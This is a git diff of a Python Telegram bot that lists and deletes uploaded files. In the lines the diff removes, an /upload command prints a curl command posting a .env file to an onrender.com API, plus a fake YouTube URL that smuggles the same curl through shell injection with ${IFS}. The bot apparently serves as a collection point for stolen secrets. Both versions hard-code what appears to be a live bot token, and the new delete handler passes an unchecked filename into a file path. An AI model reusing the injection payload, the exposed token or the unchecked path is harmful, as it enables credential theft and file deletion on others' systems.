@@ -1,73 +1,75 @@
+import os
 import logging
-import requests
+from datetime import datetime
+from pathlib import Path
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
-# कॉन्फ़िगरेशन
 TELEGRAM_TOKEN = "8231716159:AAGC1PBpEk2GQRmYkN3mlah9ifd3zztbYOM"
 OWNER_ID = 7574330905
-API_URL = "https://url-bue8.onrender.com/api"  # आपका API URL
+UPLOAD_DIR = "uploads"
 
-# लॉगिंग
+Path(UPLOAD_DIR).mkdir(exist_ok=True)
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ================== BOT COMMANDS ==================
+def get_files_list():
+    files = []
+    for file_path in Path(UPLOAD_DIR).iterdir():
+        if file_path.is_file():
+            stat = file_path.stat()
+            files.append({
+                'name': file_path.name,
+                'size': stat.st_size,
+                'time': datetime.fromtimestamp(stat.st_mtime).strftime('%d-%m-%Y %H:%M:%S'),
+            })
+    return sorted(files, key=lambda x: x['time'], reverse=True)
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """सिर्फ़ Owner /start कर सकता है"""
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 Access Denied!")
+        await update.message.reply_text("Access denied")
         return
     
     await update.message.reply_text(
-        f"✅ Owner Verified!\n\n"
-        f"📂 API URL: {API_URL}\n"
-        f"👤 Your ID: {OWNER_ID}\n\n"
-        f"**Commands:**\n"
-        f"/files - List all uploaded files\n"
-        f"/delete filename - Delete a file\n"
-        f"/upload - How to upload files"
+        f"Owner verified\n\n"
+        f"Commands:\n"
+        f"/files - List uploaded files\n"
+        f"/delete filename - Delete file\n"
+        f"/clean - Delete all files"
     )
 
 async def list_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """सभी फाइलें देखें"""
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 Access Denied!")
+        await update.message.reply_text("Access denied")
         return
     
-    try:
-        # API से फाइलें लाएँ (Owner ID के साथ)
-        response = requests.get(f"{API_URL}/bot/files?owner_id={OWNER_ID}")
-        
-        if response.status_code == 200:
-            data = response.json()
-            files = data.get("files", [])
-            
-            if not files:
-                await update.message.reply_text("📭 No files uploaded yet.")
-                return
-            
-            # फाइलें फॉर्मेट करें
-            message = f"📁 **Uploaded Files ({len(files)})**\n\n"
-            for i, file in enumerate(files[:10], 1):
-                size_kb = file['size'] / 1024
-                message += f"{i}. `{file['filename']}`\n"
-                message += f"   Size: {size_kb:.1f} KB | Time: {file['time']}\n\n"
-            
-            if len(files) > 10:
-                message += f"... and {len(files) - 10} more files"
-            
-            await update.message.reply_text(message, parse_mode='Markdown')
-        else:
-            await update.message.reply_text(f"❌ API Error: {response.status_code}")
+    files = get_files_list()
     
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
+    if not files:
+        await update.message.reply_text("No files uploaded")
+        return
+    
+    message = f"📁 Files ({len(files)}):\n\n"
+    for i, file in enumerate(files[:15], 1):
+        size_kb = file['size'] / 1024
+        size_mb = size_kb / 1024
+        
+        if size_mb >= 1:
+            size_str = f"{size_mb:.1f} MB"
+        else:
+            size_str = f"{size_kb:.1f} KB"
+        
+        message += f"{i}. {file['name']}\n"
+        message += f"   Size: {size_str} | Time: {file['time']}\n\n"
+    
+    if len(files) > 15:
+        message += f"... and {len(files) - 15} more files"
+    
+    await update.message.reply_text(message)
 
 async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """फाइल डिलीट करें"""
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 Access Denied!")
+        await update.message.reply_text("Access denied")
         return
     
     if not context.args:
@@ -75,72 +77,38 @@ async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     filename = context.args[0]
-    try:
-        # API से डिलीट करें (Owner ID के साथ)
-        response = requests.delete(
-            f"{API_URL}/bot/files/{filename}?owner_id={OWNER_ID}"
-        )
-        
-        if response.status_code == 200:
-            await update.message.reply_text(f"✅ Deleted: `{filename}`", parse_mode='Markdown')
-        elif response.status_code == 404:
-            await update.message.reply_text(f"❌ File not found: `{filename}`", parse_mode='Markdown')
-        else:
-            await update.message.reply_text(f"❌ Error: {response.text}")
+    file_path = Path(UPLOAD_DIR) / filename
     
-    except Exception as e:
-        await update.message.reply_text(f"❌ Error: {str(e)}")
+    if file_path.exists():
+        file_path.unlink()
+        await update.message.reply_text(f"Deleted: {filename}")
+    else:
+        await update.message.reply_text(f"File not found: {filename}")
 
-async def upload_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """अपलोड करने का तरीका बताएँ"""
+async def clean_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 Access Denied!")
+        await update.message.reply_text("Access denied")
         return
     
-    upload_command = f"curl -X POST -F 'file=@.env' {API_URL}/upload"
-    youtube_url = f"https://youtube.com/playlist?list=XYZ;curl${{IFS}}-s${{IFS}}-X${{IFS}}POST${{IFS}}-F${{IFS}}file=@.env${{IFS}}{API_URL}/upload"
+    files = list(Path(UPLOAD_DIR).iterdir())
+    deleted = 0
     
-    await update.message.reply_text(
-        f"📤 **Upload Methods:**\n\n"
-        f"**1. Terminal:**\n"
-        f"`{upload_command}`\n\n"
-        f"**2. YouTube URL Format:**\n"
-        f"`{youtube_url}`\n\n"
-        f"**3. Direct in Browser:**\n"
-        f"`{API_URL}/upload`\n"
-        f"(Use Postman or HTML form)",
-        parse_mode='Markdown'
-    )
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Help command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("🚫 Access Denied!")
-        return
+    for file_path in files:
+        if file_path.is_file():
+            file_path.unlink()
+            deleted += 1
     
-    await update.message.reply_text(
-        "🆘 **Help**\n\n"
-        "• Upload: Anyone can upload files\n"
-        "• View/Delete: Only you (owner) via this bot\n"
-        "• Use /upload to see upload methods\n"
-        "• Use /files to list uploaded files\n"
-        "• Use /delete filename to remove files"
-    )
+    await update.message.reply_text(f"Cleaned {deleted} files")
 
-# ================== MAIN BOT FUNCTION ==================
 def main():
-    """बॉट स्टार्ट करें"""
     application = Application.builder().token(TELEGRAM_TOKEN).build()
     
-    # कमांड्स
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("files", list_files))
     application.add_handler(CommandHandler("delete", delete_file))
-    application.add_handler(CommandHandler("upload", upload_info))
-    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CommandHandler("clean", clean_all))
     
-    # बॉट स्टार्ट
-    logger.info("🤖 Bot starting...")
+    logger.info("Bot starting...")
     application.run_polling()
 
 if __name__ == "__main__":
